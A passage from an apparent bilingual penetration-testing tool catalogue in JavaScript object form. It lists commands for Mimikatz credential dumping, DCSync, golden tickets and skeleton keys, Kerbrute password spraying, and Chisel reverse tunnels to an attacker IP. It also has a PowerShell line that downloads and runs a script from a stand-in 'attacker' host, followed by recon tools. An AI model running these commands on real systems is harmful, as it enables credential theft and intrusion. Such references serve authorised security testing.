    category: { zh: '凭证窃取', en: 'Credential Theft' },
    installation: { zh: '下载二进制文件', en: 'Download binary file' },
    commands: [
      { name: { zh: '获取Debug权限', en: 'Obtain Debug Privilege' }, command: 'privilege::debug', description: { zh: '获取Debug权限', en: 'Obtain Debug Privilege' }, platform: 'windows' },
      { name: { zh: '抓取凭证', en: 'Dump Credentials' }, command: 'sekurlsa::logonpasswords', description: { zh: '抓取所有登录凭证', en: 'Dump all login credentials' }, platform: 'windows' },
      { name: { zh: '导出LSASS', en: 'Export LSASS' }, command: 'sekurlsa::minidump lsass.dmp', description: { zh: '从LSASS转储文件提取', en: 'Extract from LSASS memory dump file' }, platform: 'windows' },
      { name: 'Pass-the-Hash', command: 'sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH', description: { zh: '哈希传递攻击', en: 'Pass-the-Hash attack' }, platform: 'windows' },
      { name: 'DCSync', command: 'lsadump::dcsync /domain:domain.com /user:Administrator', description: { zh: 'DCSync获取域管哈希', en: 'DCSync to get domain admin hash' }, platform: 'windows' },
      { name: { zh: '导出SAM', en: 'Export SAM' }, command: 'lsadump::sam', description: { zh: '导出SAM数据库', en: 'Export SAM database' }, platform: 'windows' },
      { name: { zh: '导出LSA', en: 'Export LSA' }, command: 'lsadump::lsa /inject', description: { zh: '导出LSA密钥', en: 'Export LSA keys' }, platform: 'windows' },
      { name: { zh: '黄金票据', en: 'Golden Ticket' }, command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt', description: { zh: '生成黄金票据', en: 'Generate golden ticket' }, platform: 'windows' },
      { name: { zh: '白银票据', en: 'Silver Ticket' }, command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt', description: { zh: '生成白银票据', en: 'Generate silver ticket' }, platform: 'windows' },
      { name: { zh: '列出票据', en: 'List Tickets' }, command: 'kerberos::list', description: { zh: '列出Kerberos票据', en: 'List Kerberos tickets' }, platform: 'windows' },
      { name: { zh: '导出票据', en: 'Export Tickets' }, command: 'kerberos::list /export', description: { zh: '导出Kerberos票据', en: 'Export Kerberos tickets' }, platform: 'windows' },
      { name: 'Skeleton Key', command: 'misc::skeleton', description: { zh: '植入万能密码', en: 'Inject a skeleton key (master password)' }, platform: 'windows' }
    ],
    references: ['https://github.com/gentilkiwi/mimikatz']
  },
  {
    id: 'kerbrute-tool',
    name: 'Kerbrute',
    description: { zh: 'Kerberos暴力破解工具', en: 'Kerberos brute force tool' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: '下载二进制文件', en: 'Download binary file' },
    commands: [
      { name: { zh: '用户枚举', en: 'User Enumeration' }, command: 'kerbrute userenum -d domain.com --dc dc_ip users.txt', description: { zh: '枚举域用户', en: 'Enumerate domain users' }, platform: 'all' },
      { name: { zh: '密码喷洒', en: 'Password Spraying' }, command: 'kerbrute passwordspray -d domain.com --dc dc_ip users.txt Password123', description: { zh: '密码喷洒攻击', en: 'Password spraying attack' }, platform: 'all' },
      { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'kerbrute bruteuser -d domain.com --dc dc_ip wordlist.txt username', description: { zh: '暴力破解用户', en: 'Brute force user accounts' }, platform: 'all' },
      { name: { zh: '域验证', en: 'Domain Validation' }, command: 'kerbrute -d domain.com --dc dc_ip user:password', description: { zh: '验证凭证', en: 'Verify credentials' }, platform: 'all' }
    ],
    references: ['https://github.com/ropnop/kerbrute']
  },
  {
    id: 'chisel-tool',
    name: 'Chisel',
    description: { zh: 'HTTP隧道工具', en: 'HTTP tunnel tool' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    installation: { zh: '下载二进制文件', en: 'Download binary file' },
    commands: [
      { name: { zh: '服务端', en: 'Server-Side' }, command: './chisel server -p 8000 --reverse', description: { zh: '启动服务端', en: 'Start the server' }, platform: 'linux' },
      { name: { zh: '反向SOCKS', en: 'Reverse SOCKS' }, command: 'chisel.exe client attacker_ip:8000 R:socks', description: { zh: '建立反向SOCKS代理', en: 'Establish reverse SOCKS proxy' }, platform: 'windows' },
      { name: { zh: '端口转发', en: 'Port Forwarding' }, command: 'chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389', description: { zh: '端口转发', en: 'Port Forwarding' }, platform: 'windows' },
      { name: { zh: '正向SOCKS', en: 'Forward SOCKS' }, command: 'chisel.exe client attacker_ip:8000 socks', description: { zh: '建立正向SOCKS代理', en: 'Establish forward SOCKS proxy' }, platform: 'windows' },
      { name: { zh: '多端口转发', en: 'Multi-Port Forwarding' }, command: 'chisel.exe client attacker_ip:8000 R:80:127.0.0.1:80 R:3389:127.0.0.1:3389', description: { zh: '多端口转发', en: 'Multi-Port Forwarding' }, platform: 'windows' }
    ],
    references: ['https://github.com/jpillora/chisel']
  },
  {
    id: 'sharpsmbclient-tool',
    name: 'SharpSMBClient',
    description: { zh: 'SMB客户端工具', en: 'SMB client tool' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '编译或下载二进制文件', en: 'Compile or Download binary file' },
    commands: [
      { name: { zh: '列出共享', en: 'List Shares' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -L', description: { zh: '列出SMB共享', en: 'List SMB shares' }, platform: 'windows' },
      { name: { zh: '列出目录', en: 'List Directory' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -l', description: { zh: '列出共享目录', en: 'List share directory' }, platform: 'windows' },
      { name: { zh: '下载文件', en: 'Download File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -g "path\\file"', description: { zh: '下载文件', en: 'Download File' }, platform: 'windows' },
      { name: { zh: '上传文件', en: 'Upload File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -p local_file -r remote_path', description: { zh: '上传文件', en: 'Upload File' }, platform: 'windows' }
    ],
    references: ['https://github.com/0xthirteen/SharpSMBClient']
  },
  {
    id: 'donpapi-tool',
    name: 'DonPAPI',
    description: { zh: 'DPAPI凭证提取工具', en: 'DPAPI credential extraction tool' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    installation: 'pip install donpapi',
    commands: [
      { name: { zh: '提取凭证', en: 'Extract Credentials' }, command: 'donpapi domain/user:password@target_ip', description: { zh: '提取DPAPI凭证', en: 'Extract DPAPI credentials' }, platform: 'linux' },
      { name: { zh: '使用哈希', en: 'Using Hash' }, command: 'donpapi -hashes :NTHASH domain/user@target_ip', description: { zh: '使用哈希认证', en: 'Authenticate with hash' }, platform: 'linux' },
      { name: { zh: '批量提取', en: 'Batch Extract' }, command: 'donpapi domain/user:password@targets.txt', description: { zh: '批量提取凭证', en: 'Batch extract credentials' }, platform: 'linux' }
    ],
    references: ['https://github.com/login-securite/DonPAPI']
  },
  {
    id: 'powersploit-tool',
    name: 'PowerSploit',
    description: { zh: 'PowerShell渗透测试框架', en: 'PowerShell penetration testing framework' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载脚本文件', en: 'Download script file' },
    commands: [
      { name: { zh: '加载PowerView', en: 'Load PowerView' }, command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")', description: { zh: '远程加载PowerView', en: 'Remote load PowerView' }, platform: 'windows' },
      { name: { zh: '获取域信息', en: 'Get Domain Info' }, command: 'Get-NetDomain', description: { zh: '获取域信息', en: 'Get Domain Info' }, platform: 'windows' },
      { name: { zh: '获取域用户', en: 'Get Domain Users' }, command: 'Get-NetUser', description: { zh: '获取域用户', en: 'Get Domain Users' }, platform: 'windows' },
      { name: { zh: '获取域管', en: 'Get Domain Admins' }, command: 'Get-NetGroup "Domain Admins"', description: { zh: '获取域管理员', en: 'Get Domain Admins group members' }, platform: 'windows' },
      { name: { zh: '获取域控', en: 'Get Domain Controllers' }, command: 'Get-NetDomainController', description: { zh: '获取域控制器', en: 'Get Domain Controllers' }, platform: 'windows' },
      { name: { zh: '查找管理员', en: 'Find Admins' }, command: 'Find-DomainUserLocation', description: { zh: '查找域管理员登录位置', en: 'Find where Domain Admins are logged in' }, platform: 'windows' },
      { name: { zh: '获取ACL', en: 'Get ACL' }, command: 'Get-ObjectAcl -SamAccountName target', description: { zh: '获取对象ACL', en: 'Get object ACL' }, platform: 'windows' },
      { name: { zh: '添加ACL权限', en: 'Add ACL Permission' }, command: 'Add-DomainObjectAcl -TargetIdentity target -Rights DCSync', description: { zh: '添加DCSync权限', en: 'Add DCSync permission' }, platform: 'windows' }
    ],
    references: ['https://github.com/PowerShellMafia/PowerSploit']
  },
  {
    id: 'searchsploit-tool',
    name: 'SearchSploit',
    description: { zh: '漏洞搜索工具', en: 'Vulnerability search tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install exploitdb',
    commands: [
      { name: { zh: '搜索漏洞', en: 'Search Exploits' }, command: 'searchsploit apache 2.4', description: { zh: '搜索Apache漏洞', en: 'Search for Apache vulnerabilities' }, platform: 'linux' },
      { name: { zh: '精确搜索', en: 'Exact Search' }, command: 'searchsploit -e "Apache 2.4"', description: { zh: '精确匹配搜索', en: 'Exact match search' }, platform: 'linux' },
      { name: { zh: '排除结果', en: 'Exclude Results' }, command: 'searchsploit apache --exclude="DoS"', description: { zh: '排除特定类型', en: 'Exclude specific type' }, platform: 'linux' },
      { name: { zh: '查看漏洞', en: 'View Exploit' }, command: 'searchsploit -x exploits/xxx.py', description: { zh: '查看漏洞代码', en: 'View exploit code' }, platform: 'linux' },
      { name: { zh: '复制漏洞', en: 'Copy Exploit' }, command: 'searchsploit -m exploits/xxx.py', description: { zh: '复制到当前目录', en: 'Copy to current directory' }, platform: 'linux' },
      { name: { zh: '更新数据库', en: 'Update Database' }, command: 'searchsploit -u', description: { zh: '更新漏洞数据库', en: 'Update vulnerability database' }, platform: 'linux' }
    ],
    references: ['https://www.exploit-db.com/']
  },
  {
    id: 'wfuzz-tool',
    name: 'WFuzz',
    description: { zh: 'Web模糊测试工具', en: 'Web fuzzing tool' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install wfuzz',
    commands: [
      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'wfuzz -c -w wordlist.txt http://target.com/FUZZ', description: { zh: '基础目录爆破', en: 'Basic directory brute force' }, platform: 'linux' },
      { name: { zh: '过滤响应', en: 'Filter Response' }, command: 'wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ', description: { zh: '过滤404响应', en: 'Filter 404 responses' }, platform: 'linux' },
      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://target.com/login', description: { zh: 'POST数据测试', en: 'POST data fuzzing' }, platform: 'linux' },
      { name: { zh: 'Cookie测试', en: 'Cookie Test' }, command: 'wfuzz -c -w wordlist.txt -b "session=FUZZ" http://target.com/', description: { zh: 'Cookie模糊测试', en: 'Cookie fuzzing' }, platform: 'linux' },
      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'wfuzz -c -w wordlist.txt -H "Host: FUZZ.target.com" http://target.com/', description: { zh: 'Host头测试', en: 'Host header fuzzing' }, platform: 'linux' },
      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'wfuzz -c -w wordlist.txt -R 2 http://target.com/FUZZ', description: { zh: '递归扫描', en: 'Recursive Scan' }, platform: 'linux' }
    ],
    references: ['https://github.com/xmendez/wfuzz']
  },
  {
    id: 'dirsearch',
    name: 'Dirsearch',
    description: { zh: '高级Web目录和文件暴力破解工具', en: 'Advanced web directory and file brute force tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip3 install dirsearch / git clone https://github.com/maurosoria/dirsearch',
    commands: [
      {
        name: { zh: '基础目录扫描', en: 'Basic Directory Scan' },
        command: 'dirsearch -u https://target.com -e php,asp,aspx,jsp,html,js',
        description: { zh: '扫描指定扩展名的目录和文件', en: 'Scan directories and files with specified extensions' },
        syntaxBreakdown: [
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
          { part: '-e', explanation: { zh: '指定扫描的文件扩展名', en: 'specifiedScan File extensions' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '使用自定义字典', en: 'Use Custom Wordlist' },
        command: 'dirsearch -u https://target.com -w /usr/share/wordlists/dirb/big.txt --delay=0.5',
        description: { zh: '使用自定义字典并设置请求延迟', en: 'Use custom wordlist with request delay' },
        platform: 'all'
      },
      {
        name: { zh: '递归扫描', en: 'Recursive Scan' },
        command: 'dirsearch -u https://target.com -e php -r -R 3 --exclude-status=403,404',
        description: { zh: '递归扫描3层深度，排除403/404', en: 'Recursive scan 3 levels deep, exclude 403/404' },
        platform: 'all'
      },
      {
        name: { zh: '多线程+Cookie', en: 'Multi-thread + Cookie' },
        command: 'dirsearch -u https://target.com -t 20 --cookie="session=abc123" -H "Authorization: Bearer token"',
        description: { zh: '20线程并发，携带认证信息', en: '20 concurrent threads with authentication cookies' },
        platform: 'all'
      },
      {
        name: { zh: '输出结果', en: 'Output Results' },
        command: 'dirsearch -u https://target.com -o result.json --format=json',
        description: { zh: '输出JSON格式结果', en: 'Output results in JSON format' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/maurosoria/dirsearch']
  },
  {
    id: 'feroxbuster',
    name: 'FeroxBuster',
    description: { zh: '用Rust编写的高性能递归目录发现工具', en: 'High-performance recursive directory discovery tool written in Rust' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: { zh: 'apt install feroxbuster / cargo install feroxbuster / 下载二进制: https://github.com/epi052/feroxbuster/releases', en: 'apt install feroxbuster / cargo install feroxbuster / Downloadbinary: https://github.com/epi052/feroxbuster/releases' },
    commands: [
      {
        name: { zh: '基础扫描', en: 'Basic Scan' },
        command: 'feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
        description: { zh: '使用SecLists字典扫描目录', en: 'Scan directories using a SecLists wordlist' },
        syntaxBreakdown: [
          { part: 'feroxbuster', explanation: { zh: 'Rust编写的高速目录枚举工具', en: 'High-speed directory enumeration tool written in Rust' }, type: 'command' },
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
          { part: '-w', explanation: { zh: '字典文件路径', en: 'Wordlist file path' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '递归+过滤', en: 'Recursive + Filter' },
        command: 'feroxbuster -u https://target.com -d 3 -C 403,404,500 -x php,asp,html --rate-limit 50',
        description: { zh: '递归3层，过滤状态码，限制速率', en: 'Recursive 3 levels, filter status codes, rate-limited' },
        platform: 'all'
      },
      {
        name: { zh: '带认证扫描', en: 'Authenticated Scan' },
        command: 'feroxbuster -u https://target.com -H "Cookie: session=abc" -H "Authorization: Bearer xxx" -t 30',
        description: { zh: '携带认证头，30线程并发', en: 'With authentication header, 30 concurrent threads' },
        platform: 'all'
      },
      {
        name: { zh: '自动校准', en: 'Auto Calibrate' },
        command: 'feroxbuster -u https://target.com --auto-tune --smart',
        description: { zh: '自动调整请求速率和过滤条件', en: 'Auto-calibrate request rate and filter conditions' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/epi052/feroxbuster']
  },
  {
    id: 'massdns',
    name: 'MassDNS',
    description: { zh: '高性能DNS解析器，用于子域名暴力枚举', en: 'High-performance DNS resolver for subdomain brute force enumeration' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'git clone https://github.com/blechschmidt/massdns && cd massdns && make',
    commands: [
      {
        name: { zh: '子域名枚举', en: 'Subdomain Enumeration' },
        command: 'massdns -r resolvers.txt -t A -o S -w results.txt subdomains.txt',
        description: { zh: '使用字典文件解析子域名', en: 'Resolve subdomains using a wordlist' },
        syntaxBreakdown: [
          { part: '-r resolvers.txt', explanation: { zh: 'DNS解析器列表', en: 'DNS resolver list' }, type: 'parameter' },
          { part: '-t A', explanation: { zh: '查询A记录', en: 'Query A records' }, type: 'parameter' },
          { part: '-o S', explanation: { zh: '简洁输出模式', en: 'Concise output mode' }, type: 'parameter' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: '生成子域名字典', en: 'Generate Subdomain Wordlist' },
        command: 'cat subdomains.txt | sed "s/$/.target.com/" > full_subs.txt\nmassdns -r resolvers.txt -t A -o J full_subs.txt > results.json',
        description: { zh: '批量生成子域名并JSON格式输出', en: 'Batch generate subdomains and output as JSON' },
        platform: 'linux'
      },
      {
        name: { zh: '高并发解析', en: 'High Concurrency Resolution' },
        command: 'massdns -r resolvers.txt -t A -o S -w output.txt --hashmap-size 10000 -s 10000 subs.txt',
        description: { zh: '设置并发数和哈希表大小提高性能', en: 'Set concurrency and hash table size to improve performance' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/blechschmidt/massdns']
  },
  {
    id: 'amass',
    name: 'Amass',
    description: { zh: 'OWASP出品的深度攻击面映射和资产发现工具', en: 'OWASP attack surface mapping and asset discovery tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install amass / go install github.com/owasp-amass/amass/v4/...@master / snap install amass',
    commands: [
      {
        name: { zh: '被动枚举', en: 'Passive Enumeration' },
        command: 'amass enum -passive -d target.com -o results.txt',
        description: { zh: '仅使用被动数据源枚举子域名', en: 'Enumerate subdomains using only passive data sources' },
        syntaxBreakdown: [
          { part: 'enum', explanation: { zh: '枚举模式', en: 'Enumeration mode' }, type: 'command' },
          { part: '-passive', explanation: { zh: '仅被动收集(不发送请求)', en: 'Passive collection only (no outbound requests)' }, type: 'parameter' },
          { part: '-d', explanation: { zh: '目标域名', en: 'Target domain' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '主动枚举', en: 'Active Enumeration' },
        command: 'amass enum -active -d target.com -brute -w /usr/share/amass/wordlists/subdomains-top1mil.txt',
        description: { zh: '主动DNS枚举+字典暴力破解', en: 'Active DNS enumeration + dictionary brute force' },
        platform: 'all'
      },
      {
        name: { zh: '情报收集', en: 'Intelligence Gathering' },
        command: 'amass intel -d target.com -whois\namass intel -org "Target Corp" -max-dns-queries 2500',
        description: { zh: '收集WHOIS和组织相关域名情报', en: 'Collect WHOIS and organization-related domain intelligence' },
        platform: 'all'
      },
      {
        name: { zh: '可视化', en: 'Visualization' },
        command: 'amass viz -d3 -d target.com\namass db -show -d target.com',
        description: { zh: '生成D3.js可视化图表和查看历史数据', en: 'Generate D3.js visualizations and view historical data' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/owasp-amass/amass']
  },
  {
    id: 'subfinder',
    name: 'Subfinder',
    description: { zh: '被动子域名发现工具，支持多种在线数据源', en: 'Passive subdomain discovery tool supporting multiple online data sources' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
    commands: [
      {
        name: { zh: '基础枚举', en: 'Basic Enumeration' },
        command: 'subfinder -d target.com -o subs.txt',
        description: { zh: '枚举子域名并输出到文件', en: 'Enumerate Subdomains and Output to File' },
        syntaxBreakdown: [
          { part: 'subfinder', explanation: { zh: '被动子域名枚举工具', en: 'Passive subdomain enumeration tool' }, type: 'command' },
          { part: '-d', explanation: { zh: '目标域名', en: 'Target domain' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '递归枚举', en: 'Recursive Enumeration' },
        command: 'subfinder -d target.com -recursive -all -o subs.txt',
        description: { zh: '使用所有数据源递归枚举', en: 'Enumerate recursively using all data sources' },
        platform: 'all'
      },
      {
        name: { zh: '管道联动', en: 'Pipeline Integration' },
        command: 'subfinder -d target.com -silent | httpx -silent -status-code -title',
        description: { zh: '与httpx联动探测存活子域名', en: 'Pipe into httpx to detect live subdomains' },
        platform: 'all'
      },
      {
        name: { zh: '多域名批量', en: 'Multi-Domain Batch' },
        command: 'subfinder -dL domains.txt -o all_subs.txt -t 30',
        description: { zh: '从文件读取多个域名批量枚举', en: 'Batch enumerate multiple domains from file' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/subfinder']
  },
  {
    id: 'httpx',
    name: 'HTTPX',
    description: { zh: '快速多功能HTTP探针工具，用于批量探测Web服务', en: 'Fast multi-purpose HTTP probing tool for batch web service detection' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest',
    commands: [
      {
        name: { zh: '存活探测', en: 'Alive Detection' },
        command: 'httpx -l urls.txt -status-code -title -tech-detect -o alive.txt',
        description: { zh: '批量探测URL存活状态、标题和技术栈', en: 'Batch detect URL availability, page titles, and tech stack' },
        syntaxBreakdown: [
          { part: '-status-code', explanation: { zh: '显示HTTP状态码', en: 'Display HTTP status code' }, type: 'parameter' },
          { part: '-title', explanation: { zh: '提取页面标题', en: 'Extract page title' }, type: 'parameter' },
          { part: '-tech-detect', explanation: { zh: '识别Web技术栈', en: 'Identify web technology stack' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '截图+指纹', en: 'Screenshot + Fingerprint' },
        command: 'httpx -l urls.txt -screenshot -favicon -hash md5 -jarm',
        description: { zh: '截图、提取favicon哈希和JARM指纹', en: 'Screenshot, Extractfaviconhash and JARMFingerprint' },
        platform: 'all'
      },
      {
        name: { zh: '管道使用', en: 'Pipeline Usage' },
        command: 'cat subs.txt | httpx -silent -mc 200,301,302 -content-length -web-server',
        description: { zh: '过滤指定状态码并显示服务器信息', en: 'Filter by status code and display server info' },
        platform: 'all'
      },
      {
        name: { zh: '自定义探测', en: 'Custom Probing' },
        command: 'httpx -l urls.txt -path "/api/v1/health,/admin,/.env,/robots.txt" -mc 200',
        description: { zh: '批量探测指定路径', en: 'Batch probe specified paths' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/projectdiscovery/httpx']
  },
  {
    id: 'whatweb',
    name: 'WhatWeb',
    description: { zh: 'Web指纹识别工具，识别网站使用的技术栈', en: 'Web fingerprinting tool for technology stack identification' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install whatweb / gem install whatweb',
    commands: [
      {
        name: { zh: '基础指纹', en: 'Basic Fingerprint' },
        command: 'whatweb https://target.com',
        description: { zh: '识别目标网站技术栈', en: 'Identify target website technology stack' },
        syntaxBreakdown: [
          { part: 'whatweb', explanation: { zh: 'Web技术指纹识别工具', en: 'Web technology fingerprinting tool' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '详细模式', en: 'Verbose Mode' },
        command: 'whatweb -v https://target.com -a 3',
        description: { zh: '详细输出，攻击等级3(更深度探测)', en: 'Verbose output, attack level 3 (deeper detection)' },
        platform: 'all'
      },
      {
        name: { zh: '批量扫描', en: 'Batch Scan' },
        command: 'whatweb --input-file=urls.txt --log-json=results.json',
        description: { zh: '从文件读取URL批量扫描', en: 'Read URLs from file for batch scanning' },
        platform: 'all'
      },
      {
        name: { zh: '指定插件', en: 'Specify Plugin' },
        command: 'whatweb --info-plugins\nwhatweb -p WordPress,Joomla,Drupal https://target.com',
        description: { zh: '列出或指定使用特定插件', en: 'List or use specific plugins' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/urbanadventurer/WhatWeb']
  },
  {
    id: 'wafw00f',
    name: 'WAFW00F',
    description: { zh: 'Web应用防火墙(WAF)检测和指纹识别工具', en: 'WAF detection and fingerprinting tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip3 install wafw00f',
    commands: [
      {
        name: { zh: 'WAF检测', en: 'WAF Detection' },
        command: 'wafw00f https://target.com',
        description: { zh: '检测目标是否部署WAF及WAF类型', en: 'Detect whether target deploys a WAF and identify its type' },
        syntaxBreakdown: [
          { part: 'wafw00f', explanation: { zh: 'WAF指纹识别工具', en: 'WAF fingerprinting tool' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '详细检测', en: 'Verbose Detection' },
        command: 'wafw00f https://target.com -v -a',
        description: { zh: '详细模式，测试所有WAF签名', en: 'Verbose mode, test all WAF signatures' },
        platform: 'all'
      },
      {
        name: { zh: '批量检测', en: 'Batch Detection' },
        command: 'wafw00f -i urls.txt -o results.csv',
        description: { zh: '批量检测多个URL', en: 'Batch detect multiple URLs' },
        platform: 'all'
      },
      {
        name: { zh: '列出支持WAF', en: 'List Supported WAFs' },
        command: 'wafw00f -l',
        description: { zh: '列出所有可识别的WAF产品', en: 'List all identifiable WAF products' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/EnableSecurity/wafw00f']
  },
  {
    id: 'dnsrecon',
    name: 'DNSRecon',
    description: { zh: 'DNS枚举和信息收集工具', en: 'DNS enumeration and information gathering tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install dnsrecon / pip3 install dnsrecon',
    commands: [
      {
        name: { zh: '标准枚举', en: 'Standard Enumeration' },
        command: 'dnsrecon -d target.com -t std',
        description: { zh: '标准DNS记录枚举(SOA/NS/A/MX/TXT等)', en: 'Standard DNS record enumeration (SOA/NS/A/MX/TXT, etc.)' },
        syntaxBreakdown: [
          { part: '-d', explanation: { zh: '目标域名', en: 'Target domain' }, type: 'parameter' },
          { part: '-t std', explanation: { zh: '标准记录枚举类型', en: 'Standard record enumeration type' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '区域传送', en: 'Zone Transfer' },
        command: 'dnsrecon -d target.com -t axfr',
        description: { zh: '尝试DNS区域传送', en: 'Attempt DNS zone transfer' },
        platform: 'all'
      },
      {
        name: { zh: '暴力枚举', en: 'Brute Force Enumeration' },
        command: 'dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt',
        description: { zh: '使用字典暴力枚举子域名', en: 'Brute-force subdomain enumeration using a dictionary' },
        platform: 'all'
      },
      {
        name: { zh: '反向解析', en: 'Reverse Lookup' },
        command: 'dnsrecon -r 192.168.1.0/24 -t rvl',
        description: { zh: '对IP段进行反向DNS查询', en: 'Reverse DNS lookup for IP ranges' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/darkoperator/dnsrecon']
  },
  {
    id: 'dnsenum',
    name: 'DNSEnum',
    description: { zh: 'DNS信息收集工具，支持区域传送和子域名枚举', en: 'DNS information gathering tool supporting zone transfer and subdomain enumeration' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install dnsenum',
    commands: [
      {
        name: { zh: '基础枚举', en: 'Basic Enumeration' },
        command: 'dnsenum target.com',
        description: { zh: '枚举DNS信息(NS/MX/A/区域传送等)', en: 'Enumerate DNS information (NS/MX/A/zone transfer, etc.)' },
        platform: 'all'
      },
      {
        name: { zh: '子域名暴力', en: 'Subdomain Brute Force' },
        command: 'dnsenum --enum -f /usr/share/dnsenum/dns.txt --threads 10 target.com',
        description: { zh: '使用字典暴力枚举子域名', en: 'Brute-force subdomain enumeration using a dictionary' },
        platform: 'all'
      },
      {
        name: { zh: '指定DNS服务器', en: 'Specify DNS Server' },
        command: 'dnsenum --dnsserver 8.8.8.8 target.com',
        description: { zh: '指定DNS服务器进行枚举', en: 'Enumerate using a specified DNS server' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/fwaeytens/dnsenum']
  },
  {
    id: 'theharvester',
    name: 'theHarvester',
    description: { zh: '邮箱、子域名、IP等OSINT信息收集工具', en: 'OSINT tool for gathering emails, subdomains, IPs, and more' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install theharvester / pip3 install theHarvester',
    commands: [
      {
        name: { zh: '全源搜集', en: 'All-Source Collection' },
        command: 'theHarvester -d target.com -b all -l 500',
        description: { zh: '使用所有数据源收集信息', en: 'Collect information from all data sources' },
        syntaxBreakdown: [
          { part: '-d', explanation: { zh: '目标域名', en: 'Target domain' }, type: 'parameter' },
          { part: '-b all', explanation: { zh: '使用所有可用数据源', en: 'Use all available data sources' }, type: 'parameter' },
          { part: '-l 500', explanation: { zh: '最大结果数', en: 'Maximum number of results' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定数据源', en: 'Specify Data Source' },
        command: 'theHarvester -d target.com -b google,bing,linkedin,shodan',
        description: { zh: '使用指定数据源搜集', en: 'Gather using specified data sources' },
        platform: 'all'
      },
      {
        name: { zh: '输出报告', en: 'Output Report' },
        command: 'theHarvester -d target.com -b all -f report.html',
        description: { zh: '生成HTML格式报告', en: 'Generate HTML format report' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/laramies/theHarvester']
  },
  {
    id: 'nikto',
    name: 'Nikto',
    description: { zh: 'Web服务器漏洞扫描器，检测危险文件、过时组件和配置问题', en: 'Web server vulnerability scanner for detecting dangerous files, outdated components, and misconfigurations' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install nikto / git clone https://github.com/sullo/nikto',
    commands: [
      {
        name: { zh: '基础扫描', en: 'Basic Scan' },
        command: 'nikto -h https://target.com',
        description: { zh: '对目标进行全面Web漏洞扫描', en: 'Perform a comprehensive web vulnerability scan on the target' },
        syntaxBreakdown: [
          { part: 'nikto', explanation: { zh: 'Web服务器漏洞扫描器', en: 'Web server vulnerability scanner' }, type: 'command' },
          { part: '-h', explanation: { zh: '目标主机', en: 'Target host' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定端口和SSL', en: 'Specify Port and SSL' },
        command: 'nikto -h target.com -p 8443 -ssl',
        description: { zh: '扫描HTTPS服务', en: 'Scan HTTPS service' },
        platform: 'all'
      },
      {
        name: { zh: '使用代理', en: 'Using Proxy' },
        command: 'nikto -h target.com -useproxy http://127.0.0.1:8080',
        description: { zh: '通过Burp代理进行扫描', en: 'Scan through a Burp proxy' },
        platform: 'all'
      },
      {
